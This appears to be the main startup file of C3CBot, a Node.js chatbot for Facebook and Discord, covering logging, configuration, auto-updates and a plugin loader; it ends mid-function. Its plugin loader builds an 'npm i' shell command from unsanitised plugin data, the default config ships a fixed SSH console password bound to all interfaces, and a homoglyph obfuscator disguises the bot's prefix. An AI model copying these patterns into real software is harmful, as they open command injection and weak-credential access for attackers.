/* eslint-disable consistent-this */
/* eslint-disable no-loop-func */
/* eslint-disable require-atomic-updates */
/* eslint-disable class-methods-use-this */
/* eslint-disable no-redeclare */
/* eslint-disable no-process-env */

require("./ClassModifier.js");
var _sizeObject = function (object) {
  return Object.keys(object)
    .length;
};
global.nodemodule = {};
var os = require("os");
const fs = require('fs');
var path = require("path");
const util = require('util');
var syncrequest = require('sync-request');
var wait = require('wait-for-stuff');
var semver = require("semver");
var childProcess = require("child_process");
//var url = require("url");
//var net = require('net');
var zlib = require("zlib");
var tar = require("tar-stream");
const readline = require('readline');
var speakeasy = require("speakeasy"); //2FA
var stripBom = require("strip-bom");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true,
  prompt: ""
});
var fetch = require("node-fetch");
var _checkPort = require("./checkPort.js");
var CPULoad = require("./CPULoad.js");
////var querystring = require('querystring');
////var delay = require('delay');
const StreamZip = require('node-stream-zip');
////var tf = require("@tensorflow/tfjs");
global.sshcurrsession = {};
global.sshstream = {};
//! Changing this process's priority
try {
  os.setPriority(-17); //os.constants.priority.PRIORITY_HIGH
} catch (ex) {
  console.log(
    "[NOT LOGGED]",
    "WARNING: Look like you're not running this bot in Administrator/root mode, or you're using an older NodeJS version."
  );
  if (!os.setPriority) {
    console.log(
      "[NOT LOGGED]",
      "Notice: Supported NodeJS version: 12, 13, 14"
    );
  }
  console.log("[NOT LOGGED]", "Handling setPriority error:", ex);
}

global.reload = () => {
  unloadPlugin();
  var error = loadPlugin();
  return `Reloaded${error.length == 0 ? " " : (" with error at: " + JSON.stringify(error, null, 2))}`;
};
global.fbchat = (id, mess) => {
  if (typeof facebook.api == "object") {
    var isGroup = (id.toString().length == 16);
    facebook.api.sendMessage(mess, id, () => { }, null, isGroup);
    return `Sent message: ${mess} to ${isGroup ? "Thread" : "User"} ID ${id}`;
  } else {
    return "Error: Account not logged in!";
  }
};
global.restart = () => {
  setTimeout(function () {
    process.exit(7378278);
  }, 1000);
  return "Restarting...";
};

/**
 * Find every file in a directory
 *
 * @param   {string}    startPath        A path specify where to start.
 * @param   {RegExp}    filter           Regex to filter results.
 * @param   {boolean}   arrayOutput      Options: Output array or send to callback?
 * @param   {boolean}   recursive        Options: Recursive or not?
 * @param   {function}  [callback]       Callback function.
 *
 * @return  {(Array<String>|undefined)}  An array contains path of every files match regex.
 */
function findFromDir(startPath, filter, arrayOutput, recursive, callback) {
  var nocallback = false;
  if (!callback) {
    callback = function () { };
    nocallback = true;
  }
  if (!fs.existsSync(startPath)) {
    throw "No such directory: " + startPath;
  }
  var files = fs.readdirSync(startPath);
  var arrayFile = [];
  for (var i = 0; i < files.length; i++) {
    var filename = path.join(startPath, files[i]);
    var stat = fs.lstatSync(filename);
    if (stat.isDirectory() && recursive) {
      var arrdata = findFromDir(filename, filter, true, true);
      if (!nocallback && !arrayOutput) {
        for (var n in arrdata) {
          callback(path.join(filename, arrdata[n]));
        }
      } else {
        arrayFile = arrayFile.concat(arrdata);
      }
    } else {
      if (!arrayOutput && !nocallback) {
        if (filter.test(filename)) callback(filename);
      } else {
        if (filter.test(filename)) arrayFile[arrayFile.length] = filename;
      }
    }
  }
  if (arrayOutput && !nocallback) {
    callback(arrayFile);
  } else if (arrayOutput) {
    return arrayFile;
  }
}
/**
 * Ensure <path> exists.
 *
 * @param   {string}  path  Path
 * @param   {number}  mask  Folder's mask
 *
 * @return  {object}        Error or nothing.
 */
function ensureExists(path, mask) {
  if (typeof mask != 'number') {
    mask = 0o777;
  }
  try {
    fs.mkdirSync(path, {
      mode: mask,
      recursive: true
    });
    return;
  } catch (ex) {
    return {
      err: ex
    };
  }
}
ensureExists(path.join(__dirname, "logs"));
var logFileList = findFromDir(path.join(__dirname, "logs"), /.*\.log$/, true, true);
logFileList.forEach(dir => {
  var newdir = path.join(__dirname, "logs", path.parse(dir)
    .name + ".tar.gz");
  var file = fs.readFileSync(dir);
  var pack = tar.pack();
  pack.entry({
    name: path.parse(dir)
      .name + ".log"
  }, file);
  pack.finalize();
  var tardata = Buffer.alloc(0);
  pack.on("data", chunk => {
    tardata = Buffer.concat([tardata, chunk]);
  })
    .on("end", () => {
      zlib.gzip(tardata, (err, data) => {
        if (err) throw err;
        fs.writeFileSync(newdir, data, {
          mode: 0o666
        });
        fs.unlinkSync(dir);
      });
    });
});
global.logLast = {
  year: 1970,
  month: 1,
  days: 1,
  loadTimes: 0
};
/**
 * Log to console and also write to logs file, print to every ssh console session
 *
 * @param   {any}  message     Anything
 *
 * @return  {undefined}        Function will not return anything
 */
function log(...message) {
  var date = new Date();
  readline.cursorTo(process.stdout, 0);
  var x = ["\x1b[K" + "\x1b[1;32m" + "\x1b[1;92m" + "\x1b[38;2;0;255;0m" + "[" +
    (date.getUTCFullYear()
      .pad(4) + "-" + (date.getUTCMonth() + 1)
        .pad(2) + "-" + date.getUTCDate()
          .pad(2) + "T" + date.getUTCHours()
            .pad(2) + "-" + date.getUTCMinutes()
              .pad(2) + "-" + date.getUTCSeconds()
                .pad(2) + "." + date.getUTCMilliseconds()
                  .pad(3) + "Z") + "]"];
  console.log.apply(console, x.concat(message)
    .concat(["\x1b[1;32m"]));
  rl.prompt(true);
  var tolog = "[" + (date.getUTCFullYear()
    .pad(4) + "-" + (date.getUTCMonth() + 1)
      .pad(2) + "-" + date.getUTCDate()
        .pad(2) + "T" + date.getUTCHours()
          .pad(2) + "-" + date.getUTCMinutes()
            .pad(2) + "-" + date.getUTCSeconds()
              .pad(2) + "." + date.getUTCMilliseconds()
                .pad(3) + "Z") + "]";
  for (var n in message) {
    if (typeof message[n] == "object") {
      tolog += " " + util.format("%O", message[n]);
    } else {
      tolog += " " + util.format("%s", message[n]);
    }
  }
  var currentLogDate = date.getUTCFullYear()
    .pad(4) + '-' + (date.getUTCMonth() + 1)
      .pad(2) + '-' + date.getUTCDate()
        .pad(2);
  var lastLogDate = global.logLast.year.pad(4) + "-" + global.logLast.month.pad(2) + "-" + global.logLast.days.pad(2);
  if (currentLogDate != lastLogDate) {
    var times = 0;
    for (; ;) {
      if (!fs.existsSync(path.join(__dirname, "logs", `log-${currentLogDate}-${times}.tar.gz`)) && !fs.existsSync(path
        .join(__dirname, "logs", `log-${currentLogDate}-${times}.log`))) {
        break;
      }
      times++;
    }
    global.logLast = {
      year: date.getUTCFullYear(),
      month: date.getUTCMonth() + 1,
      days: date.getUTCDate(),
      loadTimes: times
    };
  }
  fs.appendFile(
    path.join(__dirname, "logs", `log-${currentLogDate}-${global.logLast.loadTimes}.log`), tolog + "\r\n",
    function (err) {
      if (err) {
        console.log("[CRITICAL] [NOT LOGGED] ERROR WHILE WRITING LOGS: ", err);
      }
    }
  );
  var tssh = "\x1b[K" + "\x1b[1;32m" + "\x1b[1;92m" + "\x1b[38;2;0;255;0m[" + (date.getUTCFullYear()
    .pad(4) + "-" + (date.getUTCMonth() + 1)
      .pad(2) + "-" + date.getUTCDate()
        .pad(2) + "T" + date.getUTCHours()
          .pad(2) + "-" + date.getUTCMinutes()
            .pad(2) + "-" + date.getUTCSeconds()
              .pad(2) + "." + date.getUTCMilliseconds()
                .pad(3) + "Z") + "]";
  for (var n in message) {
    if (typeof message[n] == "object") {
      tssh += " " + util.formatWithOptions({
        colors: true
      }, "%O", message[n]);
    } else {
      tssh += " " + util.formatWithOptions({
        colors: true
      }, "%s", message[n]);
    }
  }
  // eslint-disable-next-line no-extra-boolean-cast
  if (!!global.sshcurrsession) {
    if (typeof global.sshcurrsession == "object") {
      for (var session in global.sshstream) {
        try {
          global.sshstream[session].stdout.write("\r");
          global.sshstream[session].stdout.write(tssh.replace(/\r\n/g, "\uFFFF")
            .replace(/\n/g, "\r\n")
            .replace(/\uFFFF/g, "\r\n") + "\r\n" + "\x1b[1;32m");
          global.sshcurrsession[session].prompt(true);
          //global.sshstream[session].stdout.write(global.sshcurrsession[session].line);
        } catch (ex) { }
      }
    }
  }
}

//Capturing STDERR
var _stderrold = process.stderr.write;
global.stderrdata = "";
process.stderr.write = function (chunk, encoding, callback) {
  global.stderrdata += chunk;
  if (typeof callback == "function") {
    callback();
  }
};
setInterval(() => {
  if (global.stderrdata != "" && global.stderrdata.indexOf("Hi there 👋. Looks like you are running TensorFlow.js in Node.js. To speed things up dramatically, install our node backend, which binds to TensorFlow C++, by running npm i @tensorflow/tfjs-node, or npm i @tensorflow/tfjs-node-gpu if you have CUDA. Then call require('@tensorflow/tfjs-node'); (-gpu suffix for CUDA) at the start of your program. Visit https://github.com/tensorflow/tfjs-node for more details.") == -1) {
    var arr = global.stderrdata.split(/[\r\n]|\r|\n/g)
      .filter((val) => val != "");
    arr.splice(arr.length - 1, 1);
    for (var n in arr) {
      log("[STDERR]", arr[n]);
    }
  }
  global.stderrdata = "";
}, 499);

var autoUpdater = require("./autoUpdater.js");
var cUpdate = autoUpdater.checkForUpdate();
//Outputs version 
var version = cUpdate.currVersion;
log("Starting C3CBot version", version, "...");
var defaultconfig = {
  testmode: false,
  baseprefix: "[Bot]",
  botname: "C3CBot",
  enablefb: false,
  usefbappstate: true,
  fbemail: "",
  fbpassword: "",
  fb2fasecret: "BASE32OFSECRETKEY",
  fbuseragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
  fblistenwhitelist: false,
  fblisten: [
    "0" //Replace 0 with FB Thread ID
  ],
  facebookAutoRestartLoggedOut: true,
  facebookProxy: null,
  facebookProxyUseSOCKS: false,
  portSOCK2HTTP: 0,
  addressSOCK2HTTP: "127.0.0.1",
  enablediscord: false,
  discordtoken: "",
  discordlistenwhitelist: false,
  discordlisten: [
    "0" //Replace 0 with Discord channel ID
  ],
  admins: [
    "FB-0", //Replace 0 with FBID
    "DC-0" //Replace 0 with Discord ID
  ],
  blacklistedUsers: [
    "FB-0", //Replace 0 with FBID
    "DC-0" //Replace 0 with Discord ID
  ],
  allowAdminUseRestartCommand: true,
  allowAdminUseShutdownCommand: false,
  allowUserUsePluginsCommand: true,
  allowUserUseReloadCommand: false,
  language: "en_US",
  allowEveryoneTagEvenBlacklisted: true,
  DEBUG_FCA_LOGLEVEL: "error",
  enableSSHRemoteConsole: false,
  sshRemoteConsoleIP: "0.0.0.0",
  sshRemoteConsolePort: 2004,
  sshUsername: "admin",
  sshPassword: "c3cbot@ADMIN",
  commandPrefix: "/",
  autoUpdate: true,
  autoUpdateTimer: 60,
  configVersion: 1,
  enableMetric: true,
  metricHideBotAccountLink: true,
  enableGlobalBan: true,
  hideUnknownCommandMessage: false,
  herokuApplication: ""
};

//Load config
global.config = fs.existsSync(path.join(__dirname, "config.json")) ? (function () {
  var readedConfig = JSON.parse(stripBom(fs.readFileSync(path.join(__dirname, "config.json"), {
    encoding: "utf8"
  })));
  for (var configName in defaultconfig) {
    if (!Object.prototype.hasOwnProperty.call(readedConfig, configName)) {
      readedConfig[configName] = defaultconfig[configName];
      log("[INTERNAL]", "Missing", configName, "in config file. Adding with default value (", defaultconfig[
        configName], ")...");
    }
  }
  for (var configName in readedConfig) {
    if (!Object.prototype.hasOwnProperty.call(defaultconfig, configName)) {
      delete readedConfig[configName];
      log("[INTERNAL]", "Deleted ", configName, "in config file. (unused)");
    }
  }
  fs.writeFileSync(path.join(__dirname, "config.json"), JSON.stringify(readedConfig, null, 4), {
    mode: 0o666
  });
  return readedConfig;
})() : (function () {
  log("[INTERNAL]", "Config file not found. Creating a default one...");
  try {
    fs.writeFileSync(path.join(__dirname, "config.json"), JSON.stringify(defaultconfig, null, 4), {
      mode: 0o666
    });
  } catch (ex) {
    log("[INTERNAL]", "Cannot write default config, returned an error: ", ex);
  }
  return defaultconfig;
})();
var testmode = global.config.testmode;
var prefix = global.config.baseprefix;
global.lang = require('js-yaml')
  .load(fs.existsSync(path.join(__dirname, "lang", global.config.language + ".yml")) ? fs.readFileSync(path.join(__dirname, "lang", global.config.language + ".yml"), {
    encoding: 'utf-8'
  }) : (function () {
    log(
      "[INTERNAL]", path.join(__dirname, "lang", global.config.language + ".yml"),
      ": not found | Defaulting to en_US.yml ..."
    );
    return fs.readFileSync(path.join(__dirname, "lang", "en_US.yml"), {
      encoding: 'utf-8'
    });
  })());
if (global.config.facebookProxyUseSOCKS) {
  var ProxyServer = require("./SOCK2HTTP.js")(log);
  var fS2HResolve = function () { };
  var S2HPromise = new Promise(resolve => {
    fS2HResolve = resolve;
  });
  var localSocksProxy = new ProxyServer({
    socks: global.config.facebookProxy
  })
    .listen(global.config.portSOCK2HTTP, global.config.addressSOCK2HTTP || "0.0.0.0")
    .on("listening", () => {
      log("[SOCK2HTTP]", `Listening at ${localSocksProxy.address().address}:${localSocksProxy.address().port}`);
      fS2HResolve({
        address: localSocksProxy.address()
          .address,
        port: localSocksProxy.address()
          .port
      });
    })
    .on("error", err => {
      log("[SOCK2HTTP]", err);
    });
  var S2HResponse = wait.for.promise(S2HPromise);
  var sock2httpPort = S2HResponse.port;
  var sock2httpAddress = S2HResponse.address;
}
/**
 * Obfuscate a string.
 *
 * @param   {string}  data  A string that you want to obfuscate.
 *
 * @return  {string}        An obfuscated string.
 */
function obf(data) {
  function Obfuscator(repl) {
    this.nrepl = 0;
    this.replacements = {};
    this.revreplacements = {};

    function removeDupes(str) {
      var rv = "";
      for (var i = 0; i < str.length; i++) {
        var ch = str.charAt(i);
        if (rv.indexOf(ch) == -1) {
          rv += ch;
        }
      }
      return rv;
    }
    for (var i = 0; i < repl.length; i++) {
      var r = repl[i];
      var original = r.charAt(0);
      var s = removeDupes(r);
      if (s.length > 1) {
        for (var j = 0; j < s.length; j++) {
          this.replacements[s.charAt(j)] = s.substring(0, j) + s.substring(j + 1);
          if (s.charAt(j) !== original) {
            this.revreplacements[s.charAt(j)] = original;
          }
          this.nrepl++;
        }
      }
    }
  }
  Obfuscator.prototype.obfuscate = function (str) {
    str = str + "";
    var rv = "";
    for (var i = 0; i < str.length; i++) {
      var c = str.charAt(i);
      var r = this.replacements[c];
      if (r) {
        var j = Math.floor(Math.random() * (r.length - 1));
        rv += r.charAt(r.charAt(j) == c ? j + 1 : j);
      } else {
        rv += c;
      }
    }
    return rv;
  };
  Obfuscator.prototype.deobfuscate = function (str) {
    str = str + "";
    var rv = "";
    for (var i = 0; i < str.length; i++) {
      var c = str.charAt(i);
      var r = this.revreplacements[c];
      if (r) {
        rv += r;
      } else {
        rv += c;
      }
    }
    return rv;
  };
  var strongObfuscator = new Obfuscator([
    "AÀÁÂÃÄÅĀĂĄǍǞǠȀȂȦΆΑАѦӐӒḀẠẢẤẦẨẬẶἈἉᾈᾉᾸᾹᾺᾼ₳ÅȺẮẰẲẴἌἎἏᾌΆǺẪ",
    "BƁΒВḂḄḆ",
    "CÇĆĈĊČƇʗСҪḈ₢₵ℂⅭϹϾҀ",
    "DÐĎĐƉƊḊḌḎḐḒⅮ",
    "EÈÉÊËĒĔĖĘĚȄȆȨΕЀЁЕӖḘḚḜẸẺẼẾỀỆḔḖỂỄԐℇƐἙῈЄ",
    "FϜḞ₣ҒƑϝғҒ₣",
    "GĜĞĠĢƓǤǦǴḠ₲",
    "HĤĦȞΗНҢҤӇӉḢḤḦḨḪῌꜦ",
    "IΊÌÍÎÏĨĪĬĮİƖƗǏȈȊΙΪІЇӀӏḬḮỈỊἸἹῘῙῚǐ1",
    "JĴʆЈʃ",
    "KĶƘǨΚЌКԞḰḲḴ₭K",
    "LĹĻĽĿŁԼḶḸḺḼℒⅬ˪",
    "MΜМӍḾṀṂⅯ",
    "NÑŃŅŇǸΝṄṆṈṊ₦Ɲ",
    "O0θϑ⍬ÒÓÔÕÖØŌŎŐƆƟƠǑǪǬǾȌȎȪȬȮȰΘΟϴОѲӦӨӪՕỌỎỐỒỔỘỚỜỞỠỢΌΌṌṐṒὈʘṎỖ",
    "PƤΡРҎṔṖῬ₱ℙ",
    "QԚℚ",
    "RŔŖŘȐȒṘṚṜṞ℞ɌⱤ",
    "SŚŜŞŠȘЅՏṠṢṨṤṦ",
    "TŢŤŦƮȚΤТҬṪṬṮṰ₮ȾΊΊꚌ",
    "UÙÚÛÜŨŪŬŮŰŲƯǓǕǗǛȔȖԱՍṲṴṶṸỤỦỨỪỬỮỰǙ⊍⊎Մ⊌Ṻ",
    "VѴѶṼṾ⋁ⅤƲ",
    "WŴԜẀẂẄẆẈ₩ƜШ",
    "XΧХҲẊẌⅩ",
    "Y¥ÝŶŸƳȲΥΫϓУҮҰẎỲỴỶỸῨῩ",
    "ZŹŻŽƵȤΖẐẒẔ",
    "aàáâãäåāăąǎǟǡǻȁȃȧаӑӓḁẚạảấầẩẫậắằẳẵặɑάαἀἁἂἃἄἅἆἇὰάᾀᾁᾂᾃᾄᾅᾆᾇᾰᾱᾲᾳᾴᾶᾷ⍶⍺ɑ",
    "bƀƃƅɒɓḃḅḇþϸƄьҍ",
    "cçćĉċčƈςϛсҫḉⅽ¢ϲҁ",
    "dďđɖɗḋḍḏḑḓⅾƌժ₫ð",
    "eèéêëēĕėęěȅȇȩеѐёҽҿӗḕḗḙḛḝẹẻẽếềểễệεɛϵєϱѳөӫɵ",
    "fſḟẛƒғϝ£ƒ",
    "gĝğġģǥǧǵɠɡգզցḡɕʛɢ",
    "hĥħȟɦɧћիհḣḥḧḩḫẖℏһʜӊ",
    "iį¡ìíîïĩīĭįıǐȉȋɨɩΐίιϊіїɪḭḯỉịἰἱἲἳὶίῑΐῐῒῖὶ",
    "jĵǰȷɟʝјյϳ",
    "kķĸƙǩκкҝҟḱḳḵ",
    "lŀĺļľłƚǀɫɬɭḷḹḻḽŀ⎩ḹ",
    "mɱḿṁṃ₥ⅿ",
    "nɴñńņňŉŋƞǹɲɳήηπпբդըղոռրṅṇṉṋἠἡἢἣἤἥἦἧὴήᾐᾑᾒᾓᾔᾕᾖᾗῂῃῄῆῇი",
    "oòóôõöōŏőơǒǫǭȍȏȫȭȯȱʘοόоӧծձօṍṏṑṓọỏốồổỗộớờởỡợὀὁὂὃὄὅὸόσ๐",
    "pþρрҏթṕṗῤῥ⍴",
    "qʠԛգզϙ",
    "rŕŗřȑȓɼɽгѓґӷṙṛṝṟгѓґӷ",
    "sśŝşšșʂѕԑṡṣṥṧṩ",
    "tţťŧƫțʈṫṭṯṱẗȶէե†ԷՒէȽҭ",
    "uµùúûüũūŭůűųưǔǖǘǚǜȕȗɥμυцկմնսվևṳṵṷṹṻụủứừửữự",
    "vʋνѵѷүұṽṿⅴ∨ΰϋύὐὑὒὓὔὕὖὗὺύῠῡῢΰῦῧʋ",
    "wŵԝẁẃẅẇẉẘ",
    "xϰхҳẋẍⅹ",
    "yýÿŷƴȳγуўӯӱӳẏẙỳỵỷỹʏ",
    "zźżžƶȥʐʑẑẓẕ",
    "2ƻƨշ",
    "3ЗҘӞƷӠЗҘӞՅɜɝзҙӟ",
    "4ЧЧӴ",
    "5Ƽ",
    "6əǝә",
    "8Ց",
    // ☌øǿ - ???
    "БƂ",
    "ГΓЃҐӶ",
    "ЖҖӜ",
    "ИЍӢӤ",
    "ЙҊ",
    "ЛӅԒΛ",
    "ПΠ",
    "ЦҴ",
    "ЬƄ",
    "ЫӸ",
    "ЪѢՒ",
    "ЭӬ",
    "вʙʙɞ",
    "жҗӂӝ",
    "зƨɜɝӟ",
    "иѝӥ",
    "йҋӣ",
    "кĸκќқҝҟҡԟ",
    "лӆԓ",
    "мӎ",
    "нʜңҥӈӊ",
    "цџҵ",
    "чҷҹӌӵ",
    "шɯա",
    "ъѣ",
    "ыӹ",
    "эǝɘəӭэӭ"
  ]);
  return strongObfuscator.obfuscate(data) || "";
}
var _prefixObf = setInterval(() => {
  prefix = obf(global.config.baseprefix);
  if (prefix == "") prefix = "\u200C";
}, 1000);
/**
 * Get a randomized number
 *
 * @param  {number} min Minimum
 * @param  {number} max Maximum
 * 
 * @returns {number} A randomized number.
 */
var random = function (min, max) {
  if (min > max) {
    var temp = min;
    min = max;
    max = temp;
  }
  var bnum = (max - min)
    .toString(16)
    .length / 2;
  if (bnum < 1) bnum = 1;
  return Math.round(parseInt(crypto.randomBytes(bnum)
    .toString('hex'), 16) / Math.pow(16, bnum * 2) * (max - min)) + min;
};
/**
 * Get some random bytes
 *
 * @param  {number} numbytes Number of bytes.
 * @returns {string} Random bytes.
 */
var _randomBytes = function (numbytes) {
  numbytes = numbytes || 1;
  return crypto.randomBytes(numbytes)
    .toString('hex');
};
//Cryptography
var crypto = require('crypto');
/**
 * Get a HMAC hash.
 *
 * @param   {string}  publick            Public key
 * @param   {string}  privatek           Private key
 * @param   {string}  [algo=sha512]      Algrorithim
 * @param   {string}  [output=hex]       Output type
 *
 * @return  {string}                     HMAC hash
 */
function _HMAC(publick, privatek, algo, output) {
  algo = algo || "sha512";
  output = output || "hex";
  var hmac = crypto.createHmac(algo, privatek);
  hmac.update(publick);
  var value = hmac.digest(output);
  return value;
}
////Global data load
//// global.dataSave = wait.for.promise(autosave('data' + (testmode ? "-test" : "") + '.json'));
//// global.data = onChange(global.dataSave.data, function(){});
//// global.watch('data', function (id, oldval, newval) {
//// global.dataSave.data = global.data;
//// });
//* Load data
if (testmode) {
  fs.existsSync(path.join(__dirname, "data-test.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data-test.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
} else {
  fs.existsSync(path.join(__dirname, "data.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
}
global.dataBackup = JSON.parse(JSON.stringify(global.data));
//*Auto-save global data clock
global.isDataSaving = false;
global.dataSavingTimes = 0;
var autosave = setInterval(function (testmode, log) {
  if ((!global.isDataSaving || global.dataSavingTimes > 3) && JSON.stringify(global.data) !== JSON.stringify(global
    .dataBackup)) {
    if (global.dataSavingTimes > 3) {
      log("[INTERNAL]", "Auto-save clock is executing over 30 seconds! (", global.dataSavingTimes, ")");
    }
    global.isDataSaving = true;
    try {
      if (testmode) {
        fs.writeFileSync(path.join(__dirname, "data-test-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-test-temp.json"), path.join(__dirname, "data-test.json"));
      } else {
        fs.writeFileSync(path.join(__dirname, "data-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-temp.json"), path.join(__dirname, "data.json"));
      }
    } catch (err) {
      log("[INTERNAL]", "Auto-save encounted an error:", err);
    }
    global.isDataSaving = false;
    global.dataSavingTimes = 0;
    global.dataBackup = JSON.parse(JSON.stringify(global.data));
  } else {
    if (JSON.stringify(global.data) != JSON.stringify(global.dataBackup)) {
      global.dataSavingTimes++;
    }
  }
}, 10000, testmode, log);

var currentCPUPercentage = 0;
var _titleClocking = setInterval(async () => {
  var titleescape1 = String.fromCharCode(27) + ']0;';
  var titleescape2 = String.fromCharCode(7);
  currentCPUPercentage = await (new CPULoad(1000));
  var title = global.config.botname + " v" + version + " | " + (currentCPUPercentage * 100)
    .toFixed(0) + "% CPU" + " | " + ((os.totalmem() - os.freemem()) / 1024 / 1024)
      .toFixed(0) + " MB" + "/" + (os.totalmem() / 1024 / 1024)
        .toFixed(0) + " MB RAM" + " | BOT: " + (process.memoryUsage()
          .rss / 1024 / 1024)
          .toFixed(0) + " MB USED";
  process.title = title;
  // eslint-disable-next-line no-extra-boolean-cast
  if (!!global.sshcurrsession) {
    if (typeof global.sshcurrsession == "object") {
      for (var session in global.sshstream) {
        try {
          global.sshstream[session].stdout.write(titleescape1 + title + titleescape2);
        } catch (ex) { }
      }
    }
  }
}, 3000);
/**
 * "require" with data as string
 *
 * @param   {string}  src       Source code
 * @param   {string}  filename  File name
 *
 * @return  {any}               module.exports of source code
 */
function requireFromString(src, filename) {
  var Module = module.constructor;
  var m = new Module();
  m._compile(src, filename);
  return m.exports;
}

//Auto updater
function checkUpdate(silent, cUpdate) {
  var newUpdate = cUpdate || autoUpdater.checkForUpdate();
  if (!silent || newUpdate.newUpdate) {
    log(
      "[Updater]",
      `You are using build ${newUpdate.currVersion}, and ${newUpdate.newUpdate ? "there is a new build (" + newUpdate.version + ")" : "there are no new build."}`
    );
  }
  if (newUpdate.newUpdate && global.config.autoUpdate) {
    log("[Updater]", `Downloading build ${newUpdate.version}...`);
    autoUpdater.installUpdate()
      .then(function (ret) {
        var [success, value] = ret;
        if (success) {
          log("[Updater]", `Updated with ${value} entries extracted. Triggering restart...`);
          process.exit(7378278);
        } else {
          log("[Updater]", "Failed to install new build:", value);
        }
      })
      .catch(function (ex) {
        log("[Updater]", "Failed to install new build:", ex);
      });
  }
}
checkUpdate(false, cUpdate);

if (global.config.autoUpdateTimer > 0 && global.config.autoUpdate) {
  setInterval(checkUpdate, global.config.autoUpdateTimer * 60 * 1000, true);
}

//Plugin Load
ensureExists(path.join(__dirname, "plugins/"));

function checkPluginCompatibly(version) {
  version = version.toString();
  try {
    //* Plugin complied with version 0.3.0 => 0.3.14 and 0.4.0 is allowed
    var allowedVersion = "0.3.0 - 0.3.14 || 0.4.0";
    return semver.intersects(semver.clean(version), allowedVersion);
  } catch (ex) {
    return false;
  }
}

function loadPlugin() {
  var error = [];
  global.plugins = {}; //Plugin Scope
  var pltemp1 = {}; //Plugin Info
  var pltemp2 = {}; //Plugin Executable
  global.fileMap = {};
  global.loadedPlugins = {};
  global.chatHook = [];
  !global.commandMapping ? global.commandMapping = {} : "";
  log("[INTERNAL]", "Searching for plugins in ./plugins/ ...");
  var pluginFileList = findFromDir(path.join(__dirname, "plugins/"), /.*\.(z3p|zip)$/, true, false);
  for (var n in pluginFileList) {
    try {
      var zip = new StreamZip({
        file: pluginFileList[n],
        storeEntries: true
      });
      wait.for.event(zip, "ready");
      try {
        var plinfo = JSON.parse(zip.entryDataSync('plugins.json')
          .toString('utf8'));
      } catch (ex) {
        throw "Invalid plugins.json file (Broken JSON)!";
      }
      if (!plinfo["plugin_name"] || !plinfo["plugin_scope"] || !plinfo["plugin_exec"]) {
        throw "Invalid plugins.json file (Not enough data)!";
      }
      if (!plinfo["complied_for"]) {
        throw "Plugin doesn't have complied_for (Complied for <=0.2.8?).";
      } else {
        if (!checkPluginCompatibly(plinfo["complied_for"])) {
          throw "Plugin is complied for version {0}, but this version doesn't compatible with it.".replace(
            "{0}",
            plinfo["complied_for"]
          );
        }
      }
      try {
        var plexec = zip.entryDataSync(plinfo["plugin_exec"])
          .toString('utf8');
      } catch (ex) {
        throw "Executable file " + plinfo["plugin_exec"] + " not found.";
      }
      if (typeof plinfo["file_map"] == "object" && !plinfo["file_map"].map) {
        for (var fd in plinfo["file_map"]) {
          try {
            global.fileMap[plinfo["file_map"][fd]] = zip.entryDataSync(fd);
          } catch (ex) {
            throw "File " + plinfo["plugin_exec"] + " not found.";
          }
        }
      }
      if (typeof plinfo["node_depends"] == "object") {
        for (var nid in plinfo["node_depends"]) {
          var defaultmodule = require("module")
            .builtinModules;
          var moduledir = path.join(__dirname, "plugins", "node_modules", nid);
          try {
            if (defaultmodule.indexOf(nid) != -1 || (["jimp", "wait-for-stuff", "deasync", "discord.js", "fca-unofficial"]).indexOf(nid) != -1) {
              global.nodemodule[nid] = require(nid);
            } else {
              global.nodemodule[nid] = require(moduledir);
            }
          } catch (ex) {
            log(
              "[INTERNAL]", pluginFileList[n], "is requiring node modules named", nid,
              "but it isn't installed. Attempting to install it through npm package manager..."
            );
            childProcess.execSync("npm i " + nid + (plinfo["node_depends"][
              nid] == "*" || plinfo["node_depends"][nid] == "" ? "" : ("@" + plinfo["node_depends"][nid])), {
              stdio: "ignore",
              cwd: path.join(__dirname, "plugins")
            });
            //Loading 3 more times before drop that plugins
            var moduleLoadTime = 0;
            var exception = "";
            var success = false;
            for (moduleLoadTime = 1; moduleLoadTime <= 3; moduleLoadTime++) {
              wait.for.promise(new Promise(x => setTimeout(x, 200)));
              require.cache = {};
              try {
                if (defaultmodule.indexOf(nid) != -1 || nid == "jimp") {
                  global.nodemodule[nid] = require(nid);
                } else {
                  global.nodemodule[nid] = require(moduledir);
                }
                success = true;
                break;
              } catch (ex) {
                exception = ex;
              }
              if (success) {
                break;
              }
            }
            if (!success) {
              throw "Cannot load node module: " + nid + ". Additional info: " + exception;
            }
          }
        }
      }
      pltemp1[plinfo["plugin_name"]] = plinfo;
      pltemp1[plinfo["plugin_name"]].filename = pluginFileList[n];
      pltemp2[plinfo["plugin_name"]] = plexec;
    } catch (ex) {
      log("[INTERNAL]", "Error while loading plugin at \"" + pluginFileList[n] + "\":", ex);
      error.push(pluginFileList[n]);
      delete pltemp1[plinfo["plugin_name"]];
      delete pltemp2[plinfo["plugin_name"]];
    }
  }
  for (var plname in pltemp1) {
    var passed = true;
    if (pltemp1[plname]["dependents"]) {
      for (var no in pltemp1[plname]["dependents"]) {
        if (typeof pltemp1[pltemp1[plname]["dependents"][no]] != "object") {
          passed = false;
          log("[INTERNAL]", plname, "depend on plugin named", pltemp1[plname][
            "dependents"][no] + ", but that plugin is not installed/loaded.");
        }
      }
    }
    if (passed) {
      try {
        global.plugins[pltemp1[plname]["plugin_scope"]] = requireFromString(pltemp2[plname], path.join(pltemp1[plname].filename, pltemp1[plname]["plugin_exec"]));
        for (var cmd in pltemp1[plname]["command_map"]) {
          var cmdo = pltemp1[plname]["command_map"][cmd];
          if (!cmdo["hdesc"] || !cmdo["fscope"] || isNaN(parseInt(cmdo["compatibly"]))) {
            log("[INTERNAL]", plname, "has a command that isn't have enough information to define (/" + cmd + ")");
          } else if (!global.plugins[pltemp1[plname]["plugin_scope"]][cmdo
            .fscope]) {
